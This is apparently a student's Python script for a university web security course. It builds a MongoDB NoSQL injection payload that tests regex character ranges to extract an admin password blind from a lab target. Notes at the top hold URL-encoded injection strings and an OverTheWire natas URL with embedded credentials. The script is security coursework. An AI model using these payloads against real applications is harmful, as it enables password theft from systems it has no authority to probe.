#CS510 Web Security Andrew Rogers Program 1
#Fall 2017

'''
natas15 address
http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/

regular expressions

Regex to match all password-- this.password.match(/^.*/)

Add MondoDB comment and inject
?search=admin' && this.password.match(/^.*/)//

Only match if first char of password is capital letter or digit
 http://131.252.220.62/mongodb/example2/?search=admin%27%20%26%26%20this.password.match(%2F%5e%5bA-Z0-9%5d.*%2F)%2F%2F

Only match if first char of password is lowercase letter 
 http://131.252.220.62/mongodb/example2/?search=admin%27%20%26%26%20this.password.match(%2F%5e%5ba-z%5d.*%2F)%2F%2F

parking lot
cap_url = "http://localhost:8000/mongodb/example2/?" + test_load ###### NORMAL LOAD

'''
import requests
import urllib
import re
from bs4 import BeautifulSoup as soup

def buildPayload(rangeStr, known_chars):
	tempPayload = "admin' && this.password.match(/^" + known_chars + "[" + rangeStr + "].*/)//"
	newPayload = {"search" : tempPayload}
	return urllib.parse.urlencode(newPayload)

full_range = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
halfLenRange = int(len(full_range) / 2)
front_range = full_range[:halfLenRange]
back_range = full_range[halfLenRange:]
pwd = ""
test_load = buildPayload(front_range, pwd)
#print(test_load)

cap_url = "http://localhost:8000/mongodb/example2/?" + test_load
session = requests.Session()
cap_response = session.get(cap_url)
tgt_soup = soup(cap_response.text, "html.parser")
if (tgt_soup.body.find_all(string="admin")):
	print("It's a match")
else:
	print("No match")
print(tgt_soup.body.find_all(string="admin"))
